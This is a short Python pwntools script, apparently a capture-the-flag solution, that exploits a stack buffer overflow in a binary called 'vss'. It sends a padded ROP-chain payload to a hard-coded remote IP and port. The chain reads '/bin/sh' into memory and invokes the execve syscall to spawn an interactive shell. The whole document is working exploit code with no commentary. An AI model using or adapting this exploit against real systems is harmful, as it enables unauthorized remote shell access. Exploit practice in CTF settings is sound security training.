from pwn import *

context(os="linux", arch="amd64", log_level = "Debug")
io = process("./vss")
e = ELF("./vss")
io = remote("114.55.66.54", 10001)
# gdb.attach(io)



syscall = 0x437eae
pop_rax = 0x46f208
pop_rdi = 0x401823
pop_rsi = 0x401937
pop_rdx = 0x43ae05
read_addr = 0x437EA0
binsh_addr = 0x6C4080
add_rsp_0x58 = 0x46f205
payload = "py" + "A" * 70 + p64(add_rsp_0x58) + p64(0) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(binsh_addr) + p64(pop_rdx) + p64(0x8) + p64(read_addr)
payload += p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(binsh_addr) + p64(pop_rsi) + p64(0) + p64(0x43ae03) + p64(0) + p64(0) + p64(syscall)
# payload = "py" + "A" * 70 + p64(add_rsp_0x58)
io.sendline(payload)
sleep(1)
io.send("/bin/sh\x00")
io.interactive()
